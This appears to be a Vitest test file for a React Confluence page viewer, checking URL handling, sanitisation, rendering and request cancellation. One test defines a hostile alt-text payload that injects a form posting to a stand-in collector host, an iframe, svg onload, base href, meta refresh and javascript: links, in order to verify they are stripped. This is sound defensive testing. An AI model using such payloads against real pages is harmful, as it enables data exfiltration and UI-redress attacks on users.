import { webcrypto } from "node:crypto";
import { setTimeout as pause } from "node:timers/promises";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import React, { act } from "react";
import { createRoot, type Root } from "react-dom/client";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { ConfluenceApi, type ConfluencePageRaw } from "@/lib/confluence-api";
import type * as ApiFactoryModule from "@/lib/create-api";
import { loadSettings, migrateSettings } from "@/lib/settings";
import type * as SettingsModule from "@/lib/settings";
import { App } from "@/viewer/App";
import type { AppSettings } from "@/types";

const mocks = vi.hoisted(() => ({
  api: undefined as ConfluenceApi | undefined,
  settings: undefined as AppSettings | undefined,
}));

vi.mock("@/lib/create-api", async (importOriginal) => ({
  ...(await importOriginal<typeof ApiFactoryModule>()),
  createConfluenceApi: vi.fn(() => mocks.api),
}));
vi.mock("@/lib/settings", async (importOriginal) => {
  const original = await importOriginal<typeof SettingsModule>();
  return { ...original, loadSettings: vi.fn(async () => mocks.settings) };
});
vi.mock("@/sidepanel/hooks/useI18n", () => ({
  useI18n: () => ({ locale: "en", t: (key: string) => key }),
}));
vi.mock("@/sidepanel/hooks/useTheme", () => ({ useTheme: () => {} }));
vi.mock("@/sidepanel/hooks/useFontSize", () => ({ useFontSize: () => {} }));

const host = "https://wiki.example.test/wiki";
const imageUrl = `${host}/download/attachments/100/lorem.png`;
const attachmentUrl = `${host}/download/attachments/100/lorem.pdf`;
type ViewerPageRaw = ConfluencePageRaw;

const hostileImageAlt = [
  "x](https://assets.example.test/leak.png) ",
  "<form action='https://collector.example.test/ingest' method='post'>",
  "<button type='submit'>Copy Markdown</button>",
  "<textarea hidden name='content'>",
  "<svg onload='alert(1)'></svg>",
  "<iframe src='https://collector.example.test/frame'></iframe>",
  "<style>.cx-viewer{display:none}</style>",
  "<base href='https://collector.example.test/'>",
  "<meta http-equiv='refresh' content='0; url=https://collector.example.test/leak'>",
  "<math><mtext>lorem</mtext></math>",
  "<div style='position:fixed;top:0;left:0;width:100%;height:100%'>overlay</div>",
  "<a href='javascript:alert(1)'>bad</a>",
].join("");

const pageWithHtml = (html: string, title = "Lorem viewer page"): ViewerPageRaw => ({
  id: "100",
  title,
  type: "page",
  status: "current",
  version: { number: 1 },
  space: { key: "LOREM" },
  body: {
    view: { value: html, representation: "view" },
    storage: { value: "<p>Lorem ipsum</p>", representation: "storage" },
  },
  _links: { base: host, webui: "/pages/viewpage.action?pageId=100" },
});

describe("online Markdown viewer resources", () => {
  let container: HTMLDivElement;
  let root: Root;
  let client: QueryClient;

  beforeEach(() => {
    Object.assign(globalThis, { IS_REACT_ACT_ENVIRONMENT: true });
    vi.stubGlobal("crypto", webcrypto);
    window.history.replaceState({}, "", `/?host=${encodeURIComponent(host)}&pageId=100`);
    mocks.settings = migrateSettings({ version: 4, activePresetId: "md-attachments" });
    mocks.api = new ConfluenceApi(host);
    client = new QueryClient({ defaultOptions: { queries: { retry: false } } });
    container = document.createElement("div");
    document.body.append(container);
    root = createRoot(container);
  });

  afterEach(async () => {
    await act(async () => root.unmount());
    client.clear();
    container.remove();
    vi.restoreAllMocks();
    vi.unstubAllGlobals();
    window.history.replaceState({}, "", "/");
  });

  it("keeps online resource targets without fetching or fabricating archived files", async () => {
    const api = mocks.api!;
    const html = `<p>Lorem ipsum</p><img src="${imageUrl}" alt="Lorem image"><a href="${attachmentUrl}">Lorem attachment</a>`;
    vi.spyOn(api, "getPage").mockResolvedValue({
      id: "100",
      title: "Lorem viewer page",
      type: "page",
      status: "current",
      version: { number: 1 },
      space: { key: "LOREM" },
      body: {
        view: { value: html, representation: "view" },
        storage: { value: "<p>Lorem ipsum</p>", representation: "storage" },
      },
      _links: { base: host, webui: "/pages/viewpage.action?pageId=100" },
    });
    const listAttachments = vi.spyOn(api, "getAttachments").mockResolvedValue([
      {
        id: "200",
        title: "lorem.pdf",
        mediaType: "application/pdf",
        fileSize: 5,
        downloadPath: attachmentUrl,
        containerId: "100",
      },
    ]);
    const blob = Object.assign(new Blob(["Lorem"], { type: "image/png" }), {
      arrayBuffer: async () => new TextEncoder().encode("Lorem").buffer,
    });
    const binary = vi.spyOn(api, "fetchBlob").mockResolvedValue(blob);
    const convert = vi.spyOn(api, "convertBody");

    await act(async () => {
      root.render(
        <QueryClientProvider client={client}>
          <App />
        </QueryClientProvider>,
      );
    });
    await vi.waitFor(async () => {
      await act(async () => {
        await pause(0);
      });
      expect(container.querySelector('img[alt="Lorem image"]')).not.toBeNull();
    });

    expect(binary).not.toHaveBeenCalled();
    expect(listAttachments).not.toHaveBeenCalled();
    expect(convert).not.toHaveBeenCalled();
    expect(container.querySelector('img[alt="Lorem image"]')?.getAttribute("src")).toBe(imageUrl);
    expect(
      [...container.querySelectorAll("a")]
        .find((link) => link.textContent === "Lorem attachment")
        ?.getAttribute("href"),
    ).toBe(attachmentUrl);
  });

  it("renders hostile image metadata as passive HTML without active controls, frames, styling, or unsafe protocols", async () => {
    const api = mocks.api!;
    const html =
      `<p>Intro</p><img src="${imageUrl}" alt="${hostileImageAlt}">` +
      `<a href="javascript:alert(2)">Bad scheme</a><p>Confidential sentinel body</p>`;
    vi.spyOn(api, "getPage").mockResolvedValue(pageWithHtml(html, "Lorem hostile page"));

    await act(async () => {
      root.render(
        <QueryClientProvider client={client}>
          <App />
        </QueryClientProvider>,
      );
    });
    await vi.waitFor(async () => {
      await act(async () => {
        await pause(0);
      });
      expect(container.querySelector(".cx-viewer-body img")).not.toBeNull();
    });

    const body = container.querySelector<HTMLElement>(".cx-viewer-body")!;
    expect(
      body.querySelectorAll(
        "form, input, textarea, select, button, iframe, frame, object, embed, " +
          "svg, math, meta, base, link, style, script, audio, video, source, track",
      ),
    ).toHaveLength(0);
    expect(
      body.querySelectorAll(
        "[style], [srcset], [ping], [srcdoc], [background], [poster], [formaction], " +
          "[action], [http-equiv]",
      ),
    ).toHaveLength(0);

    const eventAttributes = Array.from(body.querySelectorAll("*"))
      .flatMap((el) => Array.from(el.attributes))
      .map((attr) => attr.name)
      .filter((name) => /^on/i.test(name));
    expect(eventAttributes).toEqual([]);

    const navigableUrls = Array.from(body.querySelectorAll("a[href], img[src]"))
      .map((el) => el.getAttribute("href") ?? el.getAttribute("src") ?? "")
      .filter(Boolean);
    expect(navigableUrls.length).toBeGreaterThan(0);
    for (const url of navigableUrls) {
      expect(
        /^(?:(?:https?|mailto|tel):|data:image\/(?:png|gif|jpeg|webp|bmp)|[#/.])/i.test(url),
      ).toBe(true);
    }
    expect(body.textContent).toContain("Confidential sentinel body");
  });

  it("keeps legitimate links, images, details, code, tables, and emphasis readable", async () => {
    const api = mocks.api!;
    const html = `
      <h2>Overview</h2>
      <p>Lorem <strong>bold</strong>, <em>italic</em> and <del>removed</del> with a
        <a href="${attachmentUrl}">Lorem attachment</a>.</p>
      <img src="${imageUrl}" alt="Lorem image">
      <div class="expand-container">
        <div class="expand-control">More info</div>
        <div class="expand-content"><p>Hidden body</p></div>
      </div>
      <pre data-syntaxhighlighter-params="brush:js"><code>const lorem = 1;</code></pre>
      <table><tr><th>Name</th><th>Value</th></tr><tr><td>alpha</td><td>beta</td></tr></table>
    `;
    vi.spyOn(api, "getPage").mockResolvedValue(pageWithHtml(html));

    await act(async () => {
      root.render(
        <QueryClientProvider client={client}>
          <App />
        </QueryClientProvider>,
      );
    });
    await vi.waitFor(async () => {
      await act(async () => {
        await pause(0);
      });
      expect(container.querySelector(".cx-viewer-body img")).not.toBeNull();
    });

    const body = container.querySelector<HTMLElement>(".cx-viewer-body")!;
    expect(Array.from(body.querySelectorAll("h2"), (heading) => heading.textContent)).toContain(
      "Overview",
    );
    expect(body.querySelector("strong")?.textContent).toBe("bold");
    expect(body.querySelector("em")?.textContent).toBe("italic");
    expect(body.querySelector("del")?.textContent).toBe("removed");
    expect(body.querySelector(`a[href="${attachmentUrl}"]`)?.textContent).toBe("Lorem attachment");
    expect(body.querySelector(`img[src="${imageUrl}"]`)?.getAttribute("alt")).toBe("Lorem image");
    const details = body.querySelector("details");
    expect(details?.querySelector("summary")?.textContent).toBe("More info");
    expect(details?.textContent).toContain("Hidden body");
    expect(body.querySelector("pre code")?.textContent).toContain("const lorem = 1;");
    expect(Array.from(body.querySelectorAll("th"), (cell) => cell.textContent)).toEqual([
      "Name",
      "Value",
    ]);
    expect(Array.from(body.querySelectorAll("td"), (cell) => cell.textContent)).toEqual([
      "alpha",
      "beta",
    ]);
  });

  it("aborts an in-flight authenticated page read on unmount and performs no extraction or retry", async () => {
    const api = mocks.api!;
    let resolvePage!: (page: ViewerPageRaw) => void;
    let pageSignal: AbortSignal | undefined;
    vi.spyOn(api, "getPage").mockImplementation(
      (_pageId: string, _expand: string[], signal?: AbortSignal) => {
        pageSignal = signal;
        const { promise, resolve } = Promise.withResolvers<ViewerPageRaw>();
        resolvePage = resolve;
        return promise;
      },
    );
    const toPageMeta = vi.spyOn(api, "toPageMeta");

    await act(async () => {
      root.render(
        <QueryClientProvider client={client}>
          <App />
        </QueryClientProvider>,
      );
    });
    await act(async () => {
      await pause(0);
    });
    expect(api.getPage).toHaveBeenCalledTimes(1);

    await act(async () => {
      root.unmount();
    });
    await act(async () => {
      await pause(0);
    });
    expect(pageSignal?.aborted).toBe(true);

    await act(async () => {
      resolvePage(pageWithHtml("<p>Never extracted</p>"));
      await pause(5);
    });
    expect(toPageMeta).not.toHaveBeenCalled();
    expect(api.getPage).toHaveBeenCalledTimes(1);
  });

  it("cancels before authenticated reads when unmounted while settings load", async () => {
    const api = mocks.api!;
    const getPage = vi.spyOn(api, "getPage").mockResolvedValue(pageWithHtml("<p>Lorem</p>"));
    const toPageMeta = vi.spyOn(api, "toPageMeta");
    let resolveSettings!: (settings: AppSettings) => void;
    vi.mocked(loadSettings).mockImplementationOnce(() => {
      const { promise, resolve } = Promise.withResolvers<AppSettings>();
      resolveSettings = resolve;
      return promise;
    });

    await act(async () => {
      root.render(
        <QueryClientProvider client={client}>
          <App />
        </QueryClientProvider>,
      );
    });
    await act(async () => {
      await pause(0);
    });
    expect(getPage).not.toHaveBeenCalled();

    await act(async () => {
      root.unmount();
    });
    await act(async () => {
      resolveSettings(mocks.settings!);
      await pause(5);
    });
    expect(getPage).not.toHaveBeenCalled();
    expect(toPageMeta).not.toHaveBeenCalled();
  });
});
